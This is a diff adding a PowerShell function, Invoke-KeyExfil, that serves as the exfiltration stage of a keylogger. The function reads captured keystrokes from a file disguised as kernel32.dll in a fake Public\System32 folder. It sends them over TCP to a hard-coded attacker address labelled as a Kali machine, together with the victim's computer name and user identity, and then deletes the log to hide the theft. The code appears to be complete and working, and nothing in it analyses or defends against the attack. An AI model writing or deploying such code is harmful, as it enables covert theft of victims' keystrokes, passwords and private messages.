@@ -1,0 +1,46 @@
+function Invoke-KeyExfil {
+    $PublicDir = "C:\Users\Public\System32"
+    $KeyLogFile = "$PublicDir\kernel32.dll"
+    $KaliIP = "192.168.56.100"
+    $KaliPort = 5555
+
+    if (-not (Test-Path $KeyLogFile)) {
+        return
+    }
+
+    $keylog = Get-Content $KeyLogFile -Raw -EA SilentlyContinue
+    if ([string]::IsNullOrEmpty($keylog)) {
+        return
+    }
+
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.Connect($KaliIP, $KaliPort)
+
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.AutoFlush = $true
+
+        $writer.WriteLine("=== KEYLOG UPLOAD ===")
+        $writer.WriteLine("Host: $env:COMPUTERNAME")
+        $writer.WriteLine("User: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)")
+        $writer.WriteLine("Time: $(Get-Date)")
+        $writer.WriteLine("Size: $($keylog.Length) chars")
+        $writer.WriteLine("--- BEGIN KEYLOG ---")
+        $writer.Write($keylog)
+        $writer.WriteLine("")
+        $writer.WriteLine("--- END KEYLOG ---")
+
+        $writer.Close()
+        $stream.Close()
+        $client.Close()
+        $exfilOK = $true 
+    } catch {}
+
+    if ($exfilOK) {
+        Remove-Item $KeyLogFile -Force -EA SilentlyContinue
+    }
+
+}
+
+Invoke-KeyExfil
